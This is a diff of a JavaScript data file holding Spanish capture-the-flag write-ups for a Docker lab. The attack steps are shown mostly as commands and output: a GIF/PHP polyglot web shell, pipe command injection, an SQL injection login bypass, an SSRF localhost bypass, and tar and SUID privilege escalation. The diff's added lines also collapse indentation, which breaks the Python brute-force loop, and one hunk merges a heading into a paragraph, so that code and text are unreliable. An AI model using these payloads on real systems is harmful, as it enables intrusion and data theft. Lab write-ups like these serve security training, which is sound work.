@@ -1,6 +1,6 @@
 // Auto-generated writeup data
 const WRITEUPS = [
-  {id:"api-de-sectores",title:"API de sectores",category:"Web",points:250,slug:"api-de-sectores",files:["startlab.sh", "blackout-web03.tar"],content:`# API de sectores
+ {id:"api-de-sectores",title:"API de sectores",category:"Web",points:250,slug:"api-de-sectores",files:["startlab.sh", "blackout-web03.tar"],content:`# API de sectores
 
 > Tablero de telemetría de campo. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
 >
@@ -32,8 +32,8 @@ El contenedor Docker arranca y el script imprime su IP. En mi entorno fue \`172.
 
 \`\`\`bash
 $ nmap -sV 172.17.0.2
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.68 (Debian)
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.4.68 (Debian)
 \`\`\`
 
 Un único servicio web en el puerto 80.
@@ -65,10 +65,10 @@ Las páginas del menú no hablan de ninguna API, así que se fuzzean directorios
 
 \`\`\`bash
 $ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
-api        (Status: 301)
-assets     (Status: 301)
-includes   (Status: 301)
-index.php  (Status: 200)
+api (Status: 301)
+assets (Status: 301)
+includes (Status: 301)
+index.php (Status: 200)
 \`\`\`
 
 Aparece un directorio \`/api/\` que no está enlazado desde el menú — es la superficie de ataque del reto.
@@ -126,7 +126,7 @@ WHOAMI{id0r_s3ct0r21}
 ## Lección
 
 Un endpoint REST que usa un ID de recurso directo (\`/api/sector/{id}\`) debe validar que ese ID pertenece al usuario; solo autenticar la sesión no basta, porque permite leer recursos ajenos enumerando IDs (IDOR).`},
-  {id:"archivo-de-turnos",title:"Archivo de turnos",category:"Pentesting",points:300,slug:"archivo-de-turnos",files:["startlab.sh", "blackout-pt02.tar"],content:`# Archivo de turnos
+ {id:"archivo-de-turnos",title:"Archivo de turnos",category:"Pentesting",points:300,slug:"archivo-de-turnos",files:["startlab.sh", "blackout-pt02.tar"],content:`# Archivo de turnos
 
 > Nodo de archivo de turnos del sector 14. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
 >
@@ -153,9 +153,9 @@ El consejo ("el portal no es el único sitio donde el turno deja material") indi
 
 \`\`\`bash
 $ nmap -sV -p- 172.17.0.2
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.2p1 Debian
-80/tcp open  http    Apache httpd 2.4.68 (Debian)
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 9.2p1 Debian
+80/tcp open http Apache httpd 2.4.68 (Debian)
 \`\`\`
 
 SSH + HTTP. El portal web no parece tener formularios, así que hay que buscar material oculto.
@@ -170,7 +170,7 @@ User-agent: *
 Disallow: /export/
 
 $ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
-export               (Status: 301)
+export (Status: 301)
 \`\`\`
 
 **Lo que vi:** \`robots.txt\` desvela \`/export/\`, un directorio con **listado de índice activado** (Apache \`Indexes\`) que contiene \`historico_turnos.sql\`.
@@ -199,9 +199,9 @@ INSERT INTO guardia VALUES ('iris.historico','c7bd71ae7e9c...','archivo');
 import hashlib
 h2 = 'c7bd71ae7e9c9b42a68857148964bd09ee35c3ff7576bb638a41a53111a7ecee'
 for marca in ['LATAM','Latam','latam',...]:
-    for sitio in ['Norte','norte','Patio','Archivo',...]:
-        if hashlib.sha256(f'{marca}{sitio}14'.encode()).hexdigest() == h2:
-            print('MATCH:', marca+str(sitio)+'14')
+ for sitio in ['Norte','norte','Patio','Archivo',...]:
+ if hashlib.sha256(f'{marca}{sitio}14'.encode()).hexdigest() == h2:
+ print('MATCH:', marca+str(sitio)+'14')
 # → LatamNorte14
 \`\`\`
 
@@ -223,14 +223,14 @@ uid=1000(iris.historico) gid=1000(iris.historico)
 \`\`\`bash
 $ sudo -l
 User iris.historico may run the following commands:
-    (root) NOPASSWD: /usr/bin/tar
+ (root) NOPASSWD: /usr/bin/tar
 \`\`\`
 
 **Lo que vi:** puedo ejecutar \`tar\` como root sin contraseña. \`tar\` tiene un checkpoint que ejecuta comandos (\`--checkpoint-action=exec\`), la vía clásica de GTFObins para spawnear un shell:
 
 \`\`\`bash
 $ sudo tar -cf /dev/null /dev/null --checkpoint=1 \\
-    --checkpoint-action=exec="/bin/sh -c 'id > /tmp/who; cat /var/lib/latam/archivo.dat > /tmp/f'"
+ --checkpoint-action=exec="/bin/sh -c 'id > /tmp/who; cat /var/lib/latam/archivo.dat > /tmp/f'"
 $ cat /tmp/who
 uid=0(root) gid=0(root)
 \`\`\`
@@ -247,7 +247,7 @@ WHOAMI{arch1v0_turn0s}
 ## Lección
 
 El material de un reto puede vivir fuera del index: \`robots.txt\` y el listado de directorios destapan lo que el portal no muestra. Y cuando un dump SQL filtra la **política de generación de claves**, esa política permite derivar la credencial real (aquí, contra el SHA256 del usuario). Luego, un sudo sin contraseña sobre \`tar\` (GTFObins) convierte el acceso en root.`},
-  {id:"bitacora-del-blackout",title:"Bitácora del blackout",category:"Misc",points:300,slug:"bitacora-del-blackout",files:["turno.log", "alerta.wav", "spectrogram.png"],content:`# Bitácora del blackout
+ {id:"bitacora-del-blackout",title:"Bitácora del blackout",category:"Misc",points:300,slug:"bitacora-del-blackout",files:["turno.log", "alerta.wav", "spectrogram.png"],content:`# Bitácora del blackout
 
 > Export parcial del turno SCADA + alarma de audio. Reconstruye la secuencia y envía \`WHOAMI{...}\`.
 >
@@ -274,10 +274,10 @@ Un log de texto y un WAV mono de 8 kHz. La decisión: como hay un audio de corta
 **Herramienta:** \`base32 -d\`. **Por qué:** al leer el log, las líneas \`[SYNC-FRAG]\` tienen un \`payload=\` con un patrón de letras mayúsculas y \`=\`, que es la firma del **base32** (codificación en base 32 con relleno \`=\`).
 
 \`\`\`bash
-$ echo "K5EE6QKNJF5Q====" | base32 -d   # WHOAMI{
-$ echo "MIYTOYLDGBZDIXY=" | base32 -d   # b17ac0r4_
-$ echo "GR2WIMJQL4======" | base32 -d   # 4ud10_
-$ echo "NUYHENJTPU======" | base32 -d   # m0r53}
+$ echo "K5EE6QKNJF5Q====" | base32 -d # WHOAMI{
+$ echo "MIYTOYLDGBZDIXY=" | base32 -d # b17ac0r4_
+$ echo "GR2WIMJQL4======" | base32 -d # 4ud10_
+$ echo "NUYHENJTPU======" | base32 -d # m0r53}
 \`\`\`
 
 | Línea | Hora | payload (base32) | Decodificado |
@@ -301,7 +301,7 @@ $ echo "NUYHENJTPU======" | base32 -d   # m0r53}
 - Silencio largo (~13 s) = separador entre letras
 
 \`\`\`
-—  ..  ——  .        →  T  I  M  E
+— .. —— . → T I M E
 \`\`\`
 
 El Morse dice **TIME**: la clave es el **orden temporal** (los timestamps), no el número de fragmento.
@@ -319,7 +319,7 @@ WHOAMI{b17ac0r4_4ud10_m0r53}
 ## Lección
 
 Cuando un reto mezcle log + audio, mira qué hay *dentro* del audio (espectrograma/Morse) antes de adivinar el orden: suele contener la instrucción de cómo combinar los fragmentos del log.`},
-  {id:"boveda-keepass",title:"Bóveda KeePass",category:"Cripto",points:500,slug:"boveda-keepass",files:["ingeniero.kdbx", "politica_acceso.txt"],content:`# Bóveda KeePass
+ {id:"boveda-keepass",title:"Bóveda KeePass",category:"Cripto",points:500,slug:"boveda-keepass",files:["ingeniero.kdbx", "politica_acceso.txt"],content:`# Bóveda KeePass
 
 > Bóveda KeePass (ingeniero.kdbx) con las claves de recuperación del sector 14. Abre la entrada y envía \`WHOAMI{...}\`.
 >
@@ -388,7 +388,7 @@ La flag estaba en el campo \`Password\` de la entrada. *"keepass boveda 14"
 ## Lección
 
 Una bóveda KeePass vale lo que vale su contraseña maestra: si el formato de esa contraseña sigue una política corporativa predecible (\`RolDominio.Año\`) y el archivo de política se filtra junto a la bóveda, la "protección" desaparece. Además, la flag en campos protegidos se lee con \`--show-protected\`.`},
-  {id:"carga-de-evidencias",title:"Carga de evidencias",category:"Web",points:425,slug:"carga-de-evidencias",files:["startlab.sh", "blackout-web05.tar"],content:`# Carga de evidencias
+ {id:"carga-de-evidencias",title:"Carga de evidencias",category:"Web",points:425,slug:"carga-de-evidencias",files:["startlab.sh", "blackout-web05.tar"],content:`# Carga de evidencias
 
 > Bandeja de evidencias de campo. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
 >
@@ -418,8 +418,8 @@ $ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end
 172.17.0.2
 
 $ nmap -sV 172.17.0.2
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.68 (Debian)
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.4.68 (Debian)
 \`\`\`
 
 Solo el puerto 80 → el ataque es por HTTP.
@@ -431,8 +431,8 @@ En el menú aparece \`/carga.php\`, un formulario de subida de archivos con \`ac
 \`\`\`bash
 $ curl -s http://172.17.0.2/carga.php
 <form method="post" action="/carga.php" enctype="multipart/form-data">
-  <input type="file" name="evidencia" accept="image/*">
-  <button type="submit">Subir evidencia</button>
+ <input type="file" name="evidencia" accept="image/*">
+ <button type="submit">Subir evidencia</button>
 </form>
 \`\`\`
 
@@ -462,7 +462,7 @@ if ($orig === '' || $bloqueada || strncmp($ctype, 'image/', 6) !== 0 || @getimag
 \`\`\`bash
 $ sudo docker exec blackout-web05 cat /etc/apache2/conf-available/zzz-portal.conf
 <FilesMatch "\\.(phtml|php7|pht)$">
-  SetHandler application/x-httpd-php
+ SetHandler application/x-httpd-php
 </FilesMatch>
 \`\`\`
 
@@ -478,7 +478,7 @@ gif = open('/tmp/base.gif','rb').read()
 open('/tmp/evidencia.phtml','wb').write(gif + b'<?php system(\\$_GET[\\"c\\"]); ?>')
 "
 $ file /tmp/evidencia.phtml
-GIF image data, version 89a, 1 x 1     # pasa getimagesize
+GIF image data, version 89a, 1 x 1 # pasa getimagesize
 \`\`\`
 
 Subir indicando \`type=image/gif\`:
@@ -505,7 +505,7 @@ uid=33(www-data) gid=33(www-data)
 
 \`\`\`bash
 $ curl "http://172.17.0.2/evidencias/evidencia.phtml?c=ls /var/lib/latam"
-evidencia.dat  nodo.cache  turno.log
+evidencia.dat nodo.cache turno.log
 \`\`\`
 
 \`evidencia.dat\` contiene el registro con la flag en **base64**:
@@ -523,7 +523,7 @@ WHOAMI{up10ad_3v1d3nc14}
 ## Lección
 
 Una subida de archivos que valida \`getimagesize()\` pero no limita qué extensiones ejecuta Apache es vulnerable: \`.phtml\`/\`.php7\`/\`.pht\` no suelen estar en el blocklist y se interpretan como PHP. Un poliglota (GIF válido + payload PHP) combina ambas cosas y da RCE.`},
-  {id:"cartel-en-la-subestacion",title:"Cartel en la subestación",category:"Misc",points:100,slug:"cartel-en-la-subestacion",files:["subestacion.jpg"],content:`# Cartel en la subestación
+ {id:"cartel-en-la-subestacion",title:"Cartel en la subestación",category:"Misc",points:100,slug:"cartel-en-la-subestacion",files:["subestacion.jpg"],content:`# Cartel en la subestación
 
 > Durante el apagón LATAM, un operador documentó la subestación Norte. Analiza la foto y encuentra \`WHOAMI{...}\`.
 >
@@ -546,7 +546,7 @@ software=Panel SCADA export v2.1], baseline, precision 8, 1200x675
 $ exiftool -a -u -g1 subestacion.jpg
 ...
 ---- ExifIFD ----
-User Comment    : WHOAMI{3x1f_r3v34l4d_sub3st4c10n}
+User Comment : WHOAMI{3x1f_r3v34l4d_sub3st4c10n}
 \`\`\`
 
 La flag estaba directamente en el campo \`User Comment\`. Los demás campos (\`Software: Panel SCADA export v2.1\`, \`Artist: Operador turno noche (Red LATAM)\`, \`Copyright: Uso interno...\`) son ambientación del reto.
@@ -556,7 +556,7 @@ La flag estaba directamente en el campo \`User Comment\`. Los demás campos (\`S
 ## Lección
 
 Antes de buscar estego o hacer análisis pesado, revisa siempre los metadatos: \`exiftool -a -u -g1 archivo\`. Muchos retos de forensics/misc esconden la flag en campos como \`User Comment\`, \`Artist\`, \`Software\` o \`Copyright\`.`},
-  {id:"coordenadas-del-apagon",title:"Coordenadas del apagón",category:"Misc",points:500,slug:"coordenadas-del-apagon",files:["qr_a.png", "qr_b.png", "qr_c.png", "comunicado.html", "cargas.csv"],content:`# Coordenadas del apagón
+ {id:"coordenadas-del-apagon",title:"Coordenadas del apagón",category:"Misc",points:500,slug:"coordenadas-del-apagon",files:["qr_a.png", "qr_b.png", "qr_c.png", "comunicado.html", "cargas.csv"],content:`# Coordenadas del apagón
 
 > Paquete incompleto del mapa de verificación (sector 14). Recompone el mapa y envía \`WHOAMI{...}\`.
 >
@@ -637,7 +637,7 @@ WHOAMI{ + m4p4_ + bl4ck0 + ut_c0 + 0rd3n + 4d4s}
 ## Lección
 
 Cuando un reto entregue varias tiras de imagen, únelas primero (\`convert -append\`) y decodifica con \`zbarimg\` antes de analizar nada más — el código puede contener el orden de lectura de los datos.`},
-  {id:"diagnostico-de-enlace",title:"Diagnóstico de enlace",category:"Web",points:350,slug:"diagnostico-de-enlace",files:["startlab.sh", "blackout-web04.tar"],content:`# Diagnóstico de enlace
+ {id:"diagnostico-de-enlace",title:"Diagnóstico de enlace",category:"Web",points:350,slug:"diagnostico-de-enlace",files:["startlab.sh", "blackout-web04.tar"],content:`# Diagnóstico de enlace
 
 > Visor de diagnóstico de enlace de la subestación Norte. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
 >
@@ -663,7 +663,7 @@ $ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end
 172.17.0.2
 
 $ nmap -sV -p- 172.17.0.2
-80/tcp open  http    Apache httpd 2.4.68 (Debian)
+80/tcp open http Apache httpd 2.4.68 (Debian)
 \`\`\`
 
 Solo el puerto 80. Como solo hay HTTP, el ataque será por esa vía.
@@ -675,9 +675,9 @@ Al fuzzear/explorar la app aparece \`/diagnostico.php\`, que ofrece un "chequeo 
 \`\`\`php
 $host = (string) ($_POST['host'] ?? '');
 if ($host === '' || preg_match('/[;&\`\\n\\r]/', $host)) {
-    $error = '...';
+ $error = '...';
 } else {
-    $salida = shell_exec('getent ahosts ' . $host . ' 2>&1');
+ $salida = shell_exec('getent ahosts ' . $host . ' 2>&1');
 }
 \`\`\`
 
@@ -698,7 +698,7 @@ El pipe ejecuta un comando adicional. **Lo que vi:** el \`|\` ejecutó \`id\` y 
 
 \`\`\`bash
 $ curl -X POST http://172.17.0.2/diagnostico.php \\
-    --data-urlencode "host=127.0.0.1|find / -name '*.dat' 2>/dev/null | grep -v proc"
+ --data-urlencode "host=127.0.0.1|find / -name '*.dat' 2>/dev/null | grep -v proc"
 /var/lib/latam/enlace.dat
 \`\`\`
 
@@ -708,7 +708,7 @@ $ curl -X POST http://172.17.0.2/diagnostico.php \\
 
 \`\`\`bash
 $ curl -X POST http://172.17.0.2/diagnostico.php \\
-    --data-urlencode "host=127.0.0.1|cat /var/lib/latam/enlace.dat"
+ --data-urlencode "host=127.0.0.1|cat /var/lib/latam/enlace.dat"
 REGISTRO=V0hPQU1Je2NtZDFfZW5sYWMzX24wcnQzfQ==
 \`\`\`
 
@@ -724,7 +724,7 @@ WHOAMI{cmd1_enlac3_n0rt3}
 ## Lección
 
 Un campo que se mete en un \`shell_exec\` es oro. Si el filtro bloquea \`;\` y \`&\`, prueba \`|\` (pipe): ejecuta un comando adicional sin necesitar terminador. Luego, explora \`/var/lib\` o directorios de la app: ahí suelen esconder archivos \`.dat\` con la flag en base64.`},
-  {id:"evidencia-en-http",title:"Evidencia en HTTP",category:"Forense",points:500,slug:"evidencia-en-http",files:["sala_control.pcap"],content:`# Evidencia en HTTP
+ {id:"evidencia-en-http",title:"Evidencia en HTTP",category:"Forense",points:500,slug:"evidencia-en-http",files:["sala_control.pcap"],content:`# Evidencia en HTTP
 
 > Descarga PNG desde el portal forense capturada en sala de control. Extrae el archivo del PCAP y envía \`WHOAMI{...}\`.
 >
@@ -742,8 +742,8 @@ Un campo que se mete en un \`shell_exec\` es oro. Si el filtro bloquea \`;\` y \
 
 \`\`\`bash
 $ tshark -r sala_control.pcap
-  4  10.14.0.40 → 10.14.0.8   HTTP  GET /export/evidencia_sala.png HTTP/1.1
-  5  10.14.0.8  → 10.14.0.40  HTTP  HTTP/1.1 200 OK  (PNG)
+ 4 10.14.0.40 → 10.14.0.8 HTTP GET /export/evidencia_sala.png HTTP/1.1
+ 5 10.14.0.8 → 10.14.0.40 HTTP HTTP/1.1 200 OK (PNG)
 \`\`\`
 
 **Lo que vi:** un GET descarga un PNG por HTTP. Como la pista habla de una transferencia con \`Content-Type: image/png\`, la decisión es extraer ese objeto del PCAP.
@@ -769,15 +769,13 @@ Se recuperó el PNG completo.
 \`\`\`bash
 $ exiftool -a export/evidencia_sala.png
 ...
-Comment                         : WHOAMI{pcp4_c4rv3_4nd_m3rg3}
+Comment : WHOAMI{pcp4_c4rv3_4nd_m3rg3}
 \`\`\`
 
-La flag está en el campo \`Comment\` del PNG. *"pcap carve and merge"* — extraer (carve) el objeto del PCAP y revisar sus metadatos.
-
-## Lección
+La flag está en el campo \`Comment\` del PNG. ## Lección
 
 Ante un PCAP con transferencia de archivos, usa \`--export-objects http\` para extraer los archivos y luego lee sus metadatos (EXIF/\`Comment\`): los retos forenses suelen esconder la flag ahí y no en los píxeles.`},
-  {id:"exfiltracion-dns",title:"Exfiltración DNS",category:"Forense",points:300,slug:"exfiltracion-dns",files:["exfil_dns.pcap"],content:`# Exfiltración DNS
+ {id:"exfiltracion-dns",title:"Exfiltración DNS",category:"Forense",points:300,slug:"exfiltracion-dns",files:["exfil_dns.pcap"],content:`# Exfiltración DNS
 
 > Consultas DNS anómalas hacia \`exfil.blackout.redlatam\`. Reconstruye la secuencia y envía \`WHOAMI{...}\`.
 >
@@ -797,9 +795,9 @@ Las consultas DNS son la vía de exfiltración: el nombre consultado esconde los
 
 \`\`\`bash
 $ tshark -r exfil_dns.pcap
-  1  DNS  Standard query 0x0000 TXT 03-gn4gmmlml5rgynddnmyhk5d5.exfil.blackout.redlatam
-  2  DNS  Standard query 0x0000 TXT 02-mrxhgxy.exfil.blackout.redlatam
-  3  DNS  Standard query 0x0000 TXT 01-k5ee6qknjf5q.exfil.blackout.redlatam
+ 1 DNS Standard query 0x0000 TXT 03-gn4gmmlml5rgynddnmyhk5d5.exfil.blackout.redlatam
+ 2 DNS Standard query 0x0000 TXT 02-mrxhgxy.exfil.blackout.redlatam
+ 3 DNS Standard query 0x0000 TXT 01-k5ee6qknjf5q.exfil.blackout.redlatam
 \`\`\`
 
 Cada consulta es \`NN-<payload base32>.exfil.blackout.redlatam\`: un número de secuencia más un fragmento en base32. **Lo que vi:** el prefijo numérico sugiere que hay que ordenar por ese número.
@@ -822,15 +820,15 @@ $ tshark -r exfil_dns.pcap -Y "dns.qry.type == 16" -T fields -e dns.qry.name | s
 **Herramienta:** \`base32 -d\`. **Por qué:** los fragmentos son base32. El base32 usa mayúsculas; el dominio va en minúsculas, así que se normaliza a mayúsculas antes de decodificar:
 
 \`\`\`bash
-$ echo "K5EE6QKNJF5Q" | base32 -d   # WHOAMI{
-$ echo "MRXHGXY"      | base32 -d   # dns_
-$ echo "GN4GMMLML5RGYNDDNMYHK5D5" | base32 -d   # 3xf1l_bl4ck0ut}
+$ echo "K5EE6QKNJF5Q" | base32 -d # WHOAMI{
+$ echo "MRXHGXY" | base32 -d # dns_
+$ echo "GN4GMMLML5RGYNDDNMYHK5D5" | base32 -d # 3xf1l_bl4ck0ut}
 \`\`\`
 
 Concatenando \`01\` → \`02\` → \`03\`:
 
 \`\`\`
-WHOAMI{ + dns_ + 3xf1l_bl4ck0ut}  =  WHOAMI{dns_3xf1l_bl4ck0ut}
+WHOAMI{ + dns_ + 3xf1l_bl4ck0ut} = WHOAMI{dns_3xf1l_bl4ck0ut}
 \`\`\`
 
 *"dns exfil blackout"
@@ -838,7 +836,7 @@ WHOAMI{ + dns_ + 3xf1l_bl4ck0ut}  =  WHOAMI{dns_3xf1l_bl4ck0ut}
 ## Lección
 
 En un PCAP con DNS sospechoso, filtra por \`dns.qry.name\`, fíjate en dominios raros con prefijos numerados y decodifica cada fragmento: la exfiltración por DNS suele esconder la flag en base32/base64 dentro de los nombres consultados.`},
-  {id:"gateway-scada",title:"Gateway SCADA",category:"Web",points:500,slug:"gateway-scada",files:["startlab.sh", "blackout-web06.tar"],content:`# Gateway SCADA
+ {id:"gateway-scada",title:"Gateway SCADA",category:"Web",points:500,slug:"gateway-scada",files:["startlab.sh", "blackout-web06.tar"],content:`# Gateway SCADA
 
 > Gateway de consulta de telemetría. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
 >
@@ -864,7 +862,7 @@ $ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end
 172.17.0.2
 
 $ nmap -sV -p- 172.17.0.2
-80/tcp open  http    Apache httpd 2.4.68 (Debian)
+80/tcp open http Apache httpd 2.4.68 (Debian)
 \`\`\`
 
 Solo el puerto 80 → el ataque es por HTTP.
@@ -879,7 +877,7 @@ Solo el puerto 80 → el ataque es por HTTP.
 
 \`\`\`bash
 $ curl -X POST http://172.17.0.2/gateway.php \\
-    --data-urlencode "url=http://0x7f000001:9090/"
+ --data-urlencode "url=http://0x7f000001:9090/"
 {"nodo":"norte","sector":14,"kv":230}
 \`\`\`
 
@@ -891,7 +889,7 @@ Probando rutas, \`/registro\` devuelve el contenido que buscamos:
 
 \`\`\`bash
 $ curl -X POST http://172.17.0.2/gateway.php \\
-    --data-urlencode "url=http://0x7f000001:9090/registro"
+ --data-urlencode "url=http://0x7f000001:9090/registro"
 ZKRDPL{vvui_so4qw4_q0uw3}
 \`\`\`
 
@@ -913,7 +911,7 @@ WHOAMI{ssrf_pl4nt4_n0rt3}
 ## Lección
 
 El SSRF con bloqueo de \`localhost\` no protege nada: se bypasea con representaciones alternas de la IP (\`0x7f000001\`, decimal, octal…). Luego explora puertos internos y rutas del servicio alcanzado. Y ojo con las cadenas trampa en los binarios del contenedor.`},
-  {id:"informe-sector-14",title:"Informe sector 14",category:"Web",points:125,slug:"informe-sector-14",files:["startlab.sh", "blackout-web01.tar"],content:`# Informe sector 14
+ {id:"informe-sector-14",title:"Informe sector 14",category:"Web",points:125,slug:"informe-sector-14",files:["startlab.sh", "blackout-web01.tar"],content:`# Informe sector 14
 
 > LATAM Energía Red dejó un portal de consulta de informes tras el apagón del sector 14. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
 >
@@ -945,7 +943,7 @@ $ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end
 
 \`\`\`bash
 $ nmap -sV -p- 172.17.0.2
-80/tcp open  http    Apache httpd 2.4.68 (Debian)
+80/tcp open http Apache httpd 2.4.68 (Debian)
 \`\`\`
 
 Solo el puerto 80. **Lo que vi:** en el index aparece un enlace sospechoso:
@@ -984,7 +982,7 @@ WHOAMI{lf1_d0c_s3ct0r14}
 ## Lección
 
 Ante un parámetro que incluye archivos (\`?informe=xxx.php\`), prueba path traversal (\`../\`) para escapar del directorio permitido y leer archivos sensibles. Si el valor se decodifica a texto raro, suele ser base64.`},
-  {id:"intranet-del-patio",title:"Intranet del patio",category:"Pentesting",points:500,slug:"intranet-del-patio",files:["startlab.sh", "blackout-pt04.tar"],content:`# Intranet del patio
+ {id:"intranet-del-patio",title:"Intranet del patio",category:"Pentesting",points:500,slug:"intranet-del-patio",files:["startlab.sh", "blackout-pt04.tar"],content:`# Intranet del patio
 
 > Intranet del patio Norte (caja, turnos e inventario). Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
 >
@@ -1014,7 +1012,7 @@ $ nmap -sT -T4 --top-ports 2000 172.17.0.2
 21, 22, 23, 80, 199, 502 (Modbus), 2121, 8080
 
 $ nmap -sU -T4 --top-ports 100 172.17.0.2
-161/udp   open  snmp
+161/udp open snmp
 \`\`\`
 
 **Lo que vi:** SNMP en UDP (como en retos anteriores) y varios servicios TCP.
@@ -1025,8 +1023,8 @@ $ nmap -sU -T4 --top-ports 100 172.17.0.2
 
 \`\`\`bash
 $ snmpwalk -v2c -c public 172.17.0.2 1.3.6.1.2.1.1
-sysContact   = "admin"
-sysLocation  = "latam123"
+sysContact = "admin"
+sysLocation = "latam123"
 \`\`\`
 
 \`admin:latam123\` no sirve para SSH, pero es contexto.
@@ -1037,10 +1035,10 @@ sysLocation  = "latam123"
 
 \`\`\`bash
 $ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
-admin.php   (302 → /login.php)   index.php   robots.txt   sitemap.xml
+admin.php (302 → /login.php) index.php robots.txt sitemap.xml
 
 $ curl -s http://172.17.0.2/robots.txt
-Disallow: /backup-old/  /internal/
+Disallow: /backup-old/ /internal/
 \`\`\`
 
 ### 4. El código PHP revela la cuenta FTP y su política
@@ -1053,7 +1051,7 @@ El login PHP lee \`/var/lib/latam/web.auth\` (hash SHA256 de \`lidia.subestacion
 Usuario FTP local: respaldo.caja
 clave_sha256: e724a9e1...
 Politica FTP: RolCaja + # + Sitio + sector (sin espacios, sector dos digitos)
-Rol del modulo: Caja   Sitio: Norte
+Rol del modulo: Caja Sitio: Norte
 \`\`\`
 
 **Decisión:** derivar la clave FTP de la política → \`Caja#Norte14\`, y verificar contra el hash SHA256.
@@ -1064,17 +1062,17 @@ Rol del modulo: Caja   Sitio: Norte
 
 \`\`\`bash
 $ python3 -c "import hashlib; print(hashlib.sha256(b'Caja#Norte14').hexdigest())"
-e724a9e18832dc72...   # coincide con admin.inc
+e724a9e18832dc72... # coincide con admin.inc
 
 $ curl -s "ftp://respaldo.caja:Caja%23Norte14@172.17.0.2/"
-avisos/  bitacora/  inventario/  politicas/
+avisos/ bitacora/ inventario/ politicas/
 \`\`\`
 
 El FTP tiene material: \`bitacora/sesiones-2026.log\` menciona el titular **\`octavio.enlace\`** y \`politicas/rotacion_ssh.txt\` da la política SSH:
 
 \`\`\`
 Politica SSH: Nombre + : + Funcion + : + sector
-Funcion: Enlace   Nombre = primera parte del titular (antes del punto)
+Funcion: Enlace Nombre = primera parte del titular (antes del punto)
 clave_sha256: cd3a402293a22448...
 \`\`\`
 
@@ -1088,7 +1086,7 @@ clave_sha256: cd3a402293a22448...
 
 \`\`\`bash
 $ sshpass -p "Octavio:Enlace:14" ssh -o PubkeyAuthentication=no \\
-    -o PreferredAuthentications=password octavio.enlace@172.17.0.2 "id"
+ -o PreferredAuthentications=password octavio.enlace@172.17.0.2 "id"
 uid=1001(octavio.enlace)
 \`\`\`
 
@@ -1098,7 +1096,7 @@ uid=1001(octavio.enlace)
 
 \`\`\`bash
 $ find / -perm -4000 -not -path "/proc/*" 2>/dev/null
-/usr/lib/latam/in_apply          ← SUID root
+/usr/lib/latam/in_apply ← SUID root
 /usr/local/sbin/latam-backup
 /usr/local/sbin/rf_sync
 \`\`\`
@@ -1107,11 +1105,11 @@ $ find / -perm -4000 -not -path "/proc/*" 2>/dev/null
 
 \`\`\`bash
 $ objdump -d -M intel in_apply | sed -n '/<main>:/,/^$/p'
-call getenv("HOME")              # HOME controlado por el usuario
-snprintf("%s/.inrc", HOME)       # ruta: $HOME/.inrc
-fgets(...)                       # lee la primera línea del archivo
-call setuid(0); call setgid(0)   # sube a root
-call system(...)                 # ejecuta esa línea como root
+call getenv("HOME") # HOME controlado por el usuario
+snprintf("%s/.inrc", HOME) # ruta: $HOME/.inrc
+fgets(...) # lee la primera línea del archivo
+call setuid(0); call setgid(0) # sube a root
+call system(...) # ejecuta esa línea como root
 \`\`\`
 
 ### 8. Escalar a root con \`$HOME/.inrc\`
@@ -1132,7 +1130,7 @@ WHOAMI{1ntr4n3t_p4t10_n14}
 ## Lección
 
 Cadena clásica de pentesting: SNMP filtra contexto → código fuente filtra una política de claves → la política deriva credenciales FTP y SSH → un binario SUID que ejecuta \`system()\` sobre un archivo controlado por el usuario (\`$HOME/.inrc\`) convierte el acceso en root. Y un detalle importante: forzar \`PreferredAuthentications=password\` evita fallos espurios de autenticación por pubkey.`},
-  {id:"login-del-operador",title:"Login del operador",category:"Web",points:175,slug:"login-del-operador",files:["startlab.sh", "blackout-web02.tar"],content:`# Login del operador
+ {id:"login-del-operador",title:"Login del operador",category:"Web",points:175,slug:"login-del-operador",files:["startlab.sh", "blackout-web02.tar"],content:`# Login del operador
 
 > Portal de guardia de la subestación Norte. Descarga el zip del lab y ejecútalo en Kali/Linux con Docker.
 >
@@ -1165,8 +1163,8 @@ $ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end
 
 \`\`\`bash
 $ nmap -sV -p- 172.17.0.2
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.68 (Debian)
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.4.68 (Debian)
 \`\`\`
 
 Solo el puerto 80: un portal PHP (\`X-Powered-By: PHP/8.2.33\`) con secciones Inicio / Estado / Acceso guardia / Comunidad / Contacto.
@@ -1189,7 +1187,7 @@ Las variables se interpilan directo en la cadena → **SQL injection**.
 
 \`\`\`bash
 $ curl -s -X POST http://172.17.0.2/login.php \\
-    -d "usuario=admin' OR '1'='1' -- &clave=x" -c cookies.txt
+ -d "usuario=admin' OR '1'='1' -- &clave=x" -c cookies.txt
 HTTP/1.1 302 Found
 Set-Cookie: PHPSESSID=...
 Location: /turno.php
@@ -1222,7 +1220,7 @@ WHOAMI{sql1_g3r3nt3_n0rt3}
 ## Lección
 
 Los formularios de login con intercalación directa de variables en SQL son un blanco clásico de inyección. La SQLi (\`' OR '1'='1' --\`) permite entrar sin credenciales, y a veces la flag vive en otra fila/tabla de la base — conviene inspeccionarla entera, no solo la primera coincidencia.`},
